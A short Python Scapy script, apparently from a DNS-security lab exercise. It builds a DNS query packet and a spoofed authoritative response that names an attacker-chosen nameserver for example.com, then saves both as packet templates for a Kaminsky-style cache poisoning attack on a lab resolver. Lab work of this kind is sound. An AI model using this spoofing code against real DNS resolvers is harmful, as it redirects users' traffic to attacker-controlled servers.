from scapy.all import *

# combine Task6_reply and Task6_response
Qdsec = DNSQR(qname='thgys.example.com')

ip = IP(dst='10.0.2.8', src='10.0.2.9')
udp = UDP(dport=53, sport=53, chksum=0)
dns = DNS(id=100, qr=0, qdcount=1, qd=Qdsec)
# print(ip)

pkt1 = ip / udp / dns

with open('ip_req.bin', 'wb') as f:
    f.write(bytes(pkt1))

name = 'twysw.example.com'
domain = 'example.com'
ns = '10.0.2.9'

Qdsec = DNSQR(qname=name)
Anssec = DNSRR(rrname=name, type='A', rdata=ns, ttl=259200)
NSsec = DNSRR(rrname=domain, type='NS', rdata='ns.shangzewen.com', ttl=259200)

dns = DNS(id=0xAAAA,
          aa=1,
          rd=0,
          qr=1,
          qdcount=1,
          ancount=1,
          nscount=1,
          arcount=0,
          qd=Qdsec,
          an=Anssec,
          ns=NSsec)
ip = IP(dst='10.0.2.8', src='199.43.135.53', chksum=0)
udp = UDP(dport=33333, sport=53, chksum=0)

pkt = ip / udp / dns

with open('ip_resp.bin', 'wb') as f:
    f.write(bytes(pkt))
